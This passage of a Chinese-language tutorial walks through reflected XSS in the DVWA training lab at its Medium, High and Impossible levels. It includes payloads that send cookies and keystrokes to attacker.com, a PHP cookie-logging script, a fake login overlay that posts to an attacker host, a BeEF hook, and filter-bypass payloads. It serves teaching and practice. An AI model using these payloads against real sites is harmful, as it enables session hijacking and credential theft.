class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤2：窃取Cookie"><a href="#步骤2：窃取Cookie" class="headerlink" title="步骤2：窃取Cookie"></a>步骤2：窃取Cookie</h4><p><strong>Payload：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 将Cookie发送到攻击者服务器</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://attacker.com/steal.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 简化版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location=<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用img标签（更隐蔽） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=&#x27;http://attacker.com/?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>攻击者服务器（steal.php）：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 接收并记录Cookie</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookies.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&#x27; - &#x27;</span> . <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤3：键盘记录"><a href="#步骤3：键盘记录" class="headerlink" title="步骤3：键盘记录"></a>步骤3：键盘记录</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 记录用户输入</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/log.php?key=&#x27;</span> + e.<span class="property">key</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤4：钓鱼攻击"><a href="#步骤4：钓鱼攻击" class="headerlink" title="步骤4：钓鱼攻击"></a>步骤4：钓鱼攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// 创建假登录表单</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.body.innerHTML = `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Session Expired<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://attacker.com/phish.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">`;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤5：BeEF挂钩"><a href="#步骤5：BeEF挂钩" class="headerlink" title="步骤5：BeEF挂钩"></a>步骤5：BeEF挂钩</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- BeEF（Browser Exploitation Framework）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker.com:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 执行后，受害者浏览器会被BeEF控制 --&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤6：URL编码绕过"><a href="#步骤6：URL编码绕过" class="headerlink" title="步骤6：URL编码绕过"></a>步骤6：URL编码绕过</h4><p>如果链接被过滤，使用URL编码：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原始：<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">URL编码：<span class="meta">%3Cscript</span><span class="meta">%3Ealert</span><span class="meta">%28</span><span class="meta">%27XSS</span><span class="meta">%27</span><span class="meta">%29</span><span class="meta">%3C</span><span class="meta">%2Fscript</span><span class="meta">%3E</span></span><br><span class="line"></span><br><span class="line">完整URL：</span><br><span class="line">http://dvwa.local/dvwa/vulnerabilities/xss_r/<span class="built_in">?name</span>=<span class="meta">%3Cscript</span><span class="meta">%3Ealert</span><span class="meta">%28</span><span class="meta">%27XSS</span><span class="meta">%27</span><span class="meta">%29</span><span class="meta">%3C</span><span class="meta">%2Fscript</span><span class="meta">%3E</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了简单的过滤，但可以绕过。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用str_replace()过滤&lt;script&gt;标签 ★★★</span></span><br><span class="line">    <span class="comment">// str_replace() - 字符串替换函数</span></span><br><span class="line">    <span class="comment">// 参数1：要查找的字符串（&lt;script&gt;）</span></span><br><span class="line">    <span class="comment">// 参数2：替换成的字符串（空字符串，即删除）</span></span><br><span class="line">    <span class="comment">// 参数3：被搜索的字符串（用户输入）</span></span><br><span class="line">    <span class="comment">// 返回值：替换后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：只过滤小写的&lt;script&gt;，不过滤其他标签</span></span><br><span class="line">    <span class="comment">// 只替换一次，可以双写绕过</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出（仍然没有HTML编码）</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>str_replace()过滤</strong> - 删除<code>&lt;script&gt;</code>标签</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>问题分析：</strong></p>
<ol>
<li><strong>只过滤<code>&lt;script&gt;</code></strong> - 不过滤其他标签（img, svg, body等）</li>
<li><strong>大小写敏感</strong> - 只过滤小写</li>
<li><strong>只替换一次</strong> - 可以双写绕过</li>
<li><strong>无全局过滤</strong> - 不过滤事件处理器</li>
</ol>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：大小写混淆"><a href="#方法1：大小写混淆" class="headerlink" title="方法1：大小写混淆"></a>方法1：大小写混淆</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 原始被过滤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  ✗</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 大小写混淆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span>  ✓</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>  ✓</span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span>  ✓</span><br></pre></td></tr></table></figure>

<h4 id="方法2：使用其他标签"><a href="#方法2：使用其他标签" class="headerlink" title="方法2：使用其他标签"></a>方法2：使用其他标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- img标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- svg标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- body标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- iframe标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- input标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;) <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- details标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法3：双写绕过"><a href="#方法3：双写绕过" class="headerlink" title="方法3：双写绕过"></a>方法3：双写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 原理：str_replace只替换一次 --&gt;</span></span><br><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 处理过程 --&gt;</span></span><br><span class="line">1. 原始：&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. 替换<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">为空：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. 结果：绕过成功！</span><br></pre></td></tr></table></figure>

<h4 id="方法4：事件处理器"><a href="#方法4：事件处理器" class="headerlink" title="方法4：事件处理器"></a>方法4：事件处理器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- onclick --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Click me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onmouseover --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Hover me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onerror --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用正则表达式过滤，但仍可绕过。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用preg_replace()正则表达式过滤 ★★★</span></span><br><span class="line">    <span class="comment">// preg_replace() - 执行正则表达式的搜索和替换</span></span><br><span class="line">    <span class="comment">// 参数1：正则表达式模式</span></span><br><span class="line">    <span class="comment">// 参数2：替换成的字符串</span></span><br><span class="line">    <span class="comment">// 参数3：被搜索的字符串</span></span><br><span class="line">    <span class="comment">// 返回值：替换后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 正则模式：&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span></span><br><span class="line">    <span class="comment">// &lt; - 匹配小于号</span></span><br><span class="line">    <span class="comment">// (.*) - 匹配任意字符（贪婪模式）</span></span><br><span class="line">    <span class="comment">// s, c, r, i, p, t - 分别匹配这些字符</span></span><br><span class="line">    <span class="comment">// /i - 不区分大小写标志</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 目的：过滤包含&lt;...s...c...r...i...p...t的内容</span></span><br><span class="line">    <span class="comment">// 例如：&lt;script&gt;, &lt;scri pt&gt;, &lt;s c r i p t&gt;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：只过滤&lt;script&gt;相关，不过滤其他标签！</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>正则表达式过滤</strong> - 过滤各种形式的<code>&lt;script&gt;</code></li>
<li><strong>不区分大小写</strong> - <code>/i</code>标志</li>
<li><strong>匹配变形</strong> - 过滤<code>&lt;s...c...r...i...p...t</code></li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<p>仍然只过滤<code>&lt;script&gt;</code>标签，其他HTML标签和事件处理器完全可用！</p>
<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：使用img标签"><a href="#方法1：使用img标签" class="headerlink" title="方法1：使用img标签"></a>方法1：使用img标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 无论大小写都可以 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">x</span> <span class="attr">ONERROR</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：使用svg标签"><a href="#方法2：使用svg标签" class="headerlink" title="方法2：使用svg标签"></a>方法2：使用svg标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或 --&gt;</span></span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<h4 id="方法3：使用body标签"><a href="#方法3：使用body标签" class="headerlink" title="方法3：使用body标签"></a>方法3：使用body标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法4：使用iframe"><a href="#方法4：使用iframe" class="headerlink" title="方法4：使用iframe"></a>方法4：使用iframe</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或data URI --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法5：使用input"><a href="#方法5：使用input" class="headerlink" title="方法5：使用input"></a>方法5：使用input</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;) <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法6：HTML5新标签"><a href="#方法6：HTML5新标签" class="headerlink" title="方法6：HTML5新标签"></a>方法6：HTML5新标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- details --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- marquee --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- video --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- audio --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用htmlspecialchars()正确编码，无法攻破。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护：htmlspecialchars() ★★★</span></span><br><span class="line">    <span 